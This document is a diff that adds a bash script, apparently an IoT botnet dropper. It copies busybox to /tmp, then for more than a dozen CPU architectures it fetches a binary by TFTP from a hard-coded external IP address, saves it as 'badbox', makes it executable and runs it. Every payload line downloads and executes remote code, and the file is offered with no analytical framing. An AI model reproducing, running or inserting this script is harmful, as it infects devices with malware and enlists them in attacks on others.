@@ -1,0 +1,18 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnmips;cat snnmips >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnmips64;cat snnmips64 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnmipsel;cat snnmipsel >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnsh4;cat snnsh4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnx86;cat snnx86 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snni586;cat snni586 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snni686;cat snni686 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnpowerpc;cat snnpowerpc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnpowerpc440fp;cat snnpowerpc440fp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnm86k;cat snnm86k >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnsparc;cat snnsparc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnarmv4;cat snnarmv4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnarmv4tl;cat snnarmv4tl >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnarmv5;cat snnarmv5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 80.241.213.173 -c get snnarmv6;cat snnarmv6 >badbox;chmod +x *;./badbox
